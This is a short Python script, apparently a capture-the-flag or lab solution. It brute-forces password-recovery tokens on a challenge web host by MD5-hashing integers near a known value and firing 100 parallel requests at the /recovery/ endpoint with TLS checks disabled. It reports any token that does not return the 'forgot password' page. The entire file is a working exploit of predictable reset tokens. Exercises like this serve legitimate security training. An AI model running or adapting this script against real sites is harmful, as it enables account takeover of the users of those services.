import hashlib, requests
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()

BASE = "https://chl-5e69d4f4-726e-49eb-8fc5-545658be57f1-snow-storm.softwareseguro.com.ar/"
N = 2303
RANGO = 200

def probar(i):
    t = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(f"{BASE}/recovery/?t={t}", verify=False, timeout=15)
    if "¿Olvidaste tu contraseña?" not in r.text:
        print(f"[X] N={i}  token={t}")

posibles = set(range(N - RANGO, N + RANGO)) - {N}
with ThreadPoolExecutor(max_workers=100) as ex:
    list(ex.map(probar, posibles))
